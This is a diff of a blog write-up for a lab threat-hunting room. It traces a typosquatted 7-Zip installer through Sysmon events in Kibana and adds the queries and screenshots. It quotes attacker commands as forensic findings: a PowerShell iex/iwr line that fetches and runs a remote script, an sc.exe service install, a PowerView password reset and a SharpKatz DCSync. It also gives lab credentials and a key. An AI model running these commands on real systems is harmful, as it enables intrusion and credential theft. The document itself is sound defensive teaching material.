@@ -30,11 +30,17 @@ The second Hunt Me room starts with a developer who installed the wrong 7-Zip. F
 
 ## Root cause: the typosquatted 7-Zip
 
-The download's mark-of-the-web (Sysmon Event ID 15, Zone.Identifier) gives up the source instantly: **`http://www.7zipp.org/a/7z2301-x64.msi`**, a lookalike of the real `7-zip.org`. The domain resolves (Event ID 22) to **`206.189.34.218`**. The MSI is run by **`msiexec.exe`, PID 2532**, spawned by chrome.
+The download's mark-of-the-web is the fastest way in. Filtering Sysmon file-stream events for the suspicious domain, `winlog.event_id:15 and message:*7zipp*`, returns a single hit: a `Zone.Identifier` written by chrome.exe when it saved the file, and the event's `HostUrl` is the answer, **`http://www.7zipp.org/a/7z2301-x64.msi`**, a lookalike of the real `7-zip.org`.
 
-![Terminal card of the initial access and service install: the typosquatted MSI, the second-stage 7z.ps1, and the 7zService](/img/thm-typosquat/02-access-service.png)
+![Real Kibana Discover view: the query winlog.event_id:15 and message contains 7zipp returns one mark-of-the-web event showing 7z2301-x64.msi saved into perry.parsons Downloads by chrome.exe](/img/thm-typosquat/kb-01-download.png)
 
-The MSI kicks off a second-stage payload, **`powershell.exe iex(iwr http://www.7zipp.org/a/7z.ps1 -useb)`**. That `7z.ps1` is clever: it downloads and silently installs the *real* 7-Zip to **`C:\Windows\Temp\7zlegit.exe`** as a decoy so the user sees a working install, then drops a malicious DLL and registers it as a service with `sc.exe create 7zService binpath= "C:\Program Files\7-zip\7zipp.exe"`. The installed service is **`7zService`**, running as **`SYSTEM`**.
+The domain resolves (Event ID 22) to **`206.189.34.218`**. Pivoting to how the MSI ran, `process.name:"msiexec.exe" and process.command_line:*7z2301*` shows it executed by **`msiexec.exe`, PID 2532**, spawned by chrome.exe.
+
+![Real Kibana Discover view: filtering msiexec.exe running 7z2301-x64.msi shows process ID 2,532 with parent chrome.exe](/img/thm-typosquat/kb-02-msiexec.png)
+
+The MSI kicks off a second-stage payload, **`powershell.exe iex(iwr http://www.7zipp.org/a/7z.ps1 -useb)`**. That `7z.ps1` is clever: it downloads and silently installs the *real* 7-Zip to **`C:\Windows\Temp\7zlegit.exe`** as a decoy so the user sees a working install, then drops a malicious DLL and registers it as a service with `sc.exe create 7zService binpath= "C:\Program Files\7-zip\7zipp.exe"`. Searching `process.command_line:*7zService* or process.command_line:*7zlegit*` surfaces exactly that activity: the installed service is **`7zService`**, running as **`SYSTEM`**, and the decoy installer runs as `"C:\Windows\Temp\7zlegit.exe" /S`.
+
+![Real Kibana Discover view: the 7zService or 7zlegit query returns three hits including the silent 7zlegit.exe decoy installer](/img/thm-typosquat/kb-03-service.png)
 
 ## Credential access
 
@@ -46,13 +52,13 @@ Running as SYSTEM, the implant goes after credentials. It pulls `Invoke-NanoDump
 
 With james.cromwell's context the attacker pivots into Active Directory. Using PowerView's `Set-DomainUserPassword`, they reset **`SSF\anna.jones`** to the password **`pwn3dpw!!!`** and log in with it on **`WKSTN-02`**. Enumerating onward to WKSTN-03 they uncover a second stored credential, **`SSF\itadmin : NoO6@39Sk0!`**.
 
-![Terminal card of the escalation and impact: PtH, password reset, DCSync of the domain admin, and the bomb.exe ransomware](/img/thm-typosquat/03-privesc-impact.png)
-
 The endgame is a DCSync of the domain admin, `damian.hall`. It is run with mimikatz (`lsadump::dcsync`) and, the room's answer, also with the PowerShell script **`Invoke-SharpKatz.ps1`** (`Invoke-Sharpkatz --Command dcsync --User damian.hall`). The replication output hands over damian.hall's **AES256 key `f28a16b8d3f5163cb7a7f7ed2c8f2cf0419f0b0c2e28c15f831d050f5edaa534`**.
 
 ## Impact
 
-Domain admin in hand, the attacker deploys ransomware, `bomb.exe` (downloaded as `777bomb.exe`), across workstations. Counting the files it creates (Event ID 11 with the creating process `bomb.exe`) gives **46** files, each encrypted and renamed with a `.777zzz` extension.
+Domain admin in hand, the attacker deploys ransomware, `bomb.exe` (downloaded as `777bomb.exe`), across workstations. The count falls straight out of Discover: `process.name:"bomb.exe" and winlog.event_id:11` returns **46 hits**, each a file the ransomware created and renamed with a `.777zzz` extension.
+
+![Real Kibana Discover view: process.name bomb.exe with event ID 11 returns 46 hits, files renamed to a .777zzz extension](/img/thm-typosquat/kb-07-ransomware.png)
 
 ![Card listing all fifteen answers for the room](/img/thm-typosquat/04-answers.png)
 
